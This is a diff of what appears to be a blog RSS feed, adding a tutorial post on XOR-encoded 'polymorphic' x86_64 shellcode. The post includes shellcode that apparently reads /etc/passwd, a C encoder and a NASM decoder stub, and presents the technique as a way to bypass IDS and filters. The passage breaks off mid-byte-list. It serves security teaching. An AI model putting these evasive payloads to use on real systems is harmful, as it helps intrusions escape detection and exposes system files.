@@ -726,6 +726,199 @@ TWCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;pwnable_warmup_I_did_it!&lt;s
 			</item>
 		
 			<item>
+				<title>Polymorphic shellcode</title>
+				<description>&lt;h1 id=&quot;1-surroundings&quot;&gt;1. Surroundings&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux debian 3.16.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+No LSB modules are available.
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 8.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jessie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Release:	8.7
+Codename:	jessie
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian 4.9.2-10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4.9.2
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+NASM version 2.11.05 compiled on Sep  9 2014
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+GNU ld &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU Binutils &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.25
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;2-explanation&quot;&gt;2. Explanation&lt;/h1&gt;
+&lt;p&gt;For the second post of the shellcode serie, I will show you the polymorphic shellcode method.
+This method has lots of advantages. For example, the encoded shellcode can contain null bytes, she is very easy to implement and also very powerfull to bypass IDS and filters. The shellcode is composed of two parts:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+--------------------+-------------------+
+|                    |                   |
+|      DECODER       | ENCODED SHELLCODE |
+|                    |                   |
++--------------------+-------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, we will first have the decoder and the encoded shellcode. The aim is first to decode the encoded shellcode thanks to the decoder and then jump on the decoded shellcode to execute code. The operations uses to encoded/decoded the shellcode can be very different, like addition, subtraction, xor, etc. For this post, I have choose the xor algorithm with a very basic key. This shellcode is not the most optimized.&lt;/p&gt;
+
+&lt;h1 id=&quot;3-shellcode-writting&quot;&gt;3. Shellcode writting&lt;/h1&gt;
+&lt;p&gt;We first need a shellcode to XOR it. I’ve choose the one of &lt;a href=&quot;/shellcode/2017/05/28/basic_shellcode.html&quot;&gt;my previous article&lt;/a&gt;. To XOR the shellcode, I choose the byte 0x69. This his key is very basic for two reason:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;First because it impact the final shellcode length.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Second because the next encoded shellcode don’t contain this byte. (cf: 1^1 = 0 so null byte)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s encoded the shellcode:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;xor.c
+&lt;span class=&quot;c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+
+unsigned char shellcode[] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;eb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;41&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+int main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;void&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int i &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; shellcode[i]&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; i++&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x%02x,&quot;&lt;/span&gt;, shellcode[i] ^ 0x69&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc xor.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; xor &lt;span class=&quot;nt&quot;&gt;-std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c99
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./xor 
+0x82,0x50,0x36,0xe9,0x1e,0x62,0x28,0x21,0x58,0xa9,0x6d,0x6b,0x21,0x58,0x9f,0x66,0x6c,0x21,0xe0,0xae,0x21,0xe4,0x5d,0x4d,0x21,0x58,0xbb,0x0f,0xd3,0x96,0x66,0x21,0x58,0xa9,0x66,0x6c,0x21,0x58,0x96,0x29,0xde,0x68,0x21,0xe0,0xab,0x21,0x58,0xa9,0xd9,0x68,0x66,0x6c,0x21,0x58,0xa9,0xd9,0x55,0x66,0x6c,0x81,0xab,0x96,0x96,0x96,0x46,0x0c,0x1d,0x0a,0x46,0x19,0x08,0x1a,0x1a,0x1e,0x0d,0x28,
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s ok for the encoded shellcode part. Now we will do the decoder. It will be a basic loop which will iterate all over the encoded shellcode, XOR every bytes and then jump on the decoded shellcode.&lt;/p&gt;
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L1&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;                      &lt;span class=&quot;c&quot;&gt;; First pop &quot;shell&quot; value to RSI&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;                 &lt;span class=&quot;c&quot;&gt;; Move &quot;shell&quot; length (76) to cl&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; XOR the &quot;shell&quot; byte with the key&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;                    &lt;span class=&quot;c&quot;&gt;; Substracte the &quot;shell&quot; length of 1&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;jnz&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L3&lt;/span&gt;                       &lt;span class=&quot;c&quot;&gt;; Loop if cl is none zero&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; XOR the last byte&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L4&lt;/span&gt;                       &lt;span class=&quot;c&quot;&gt;; Jump on the decoded shellcode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;kt&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x82&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xae&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xde&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xd9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x81&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span 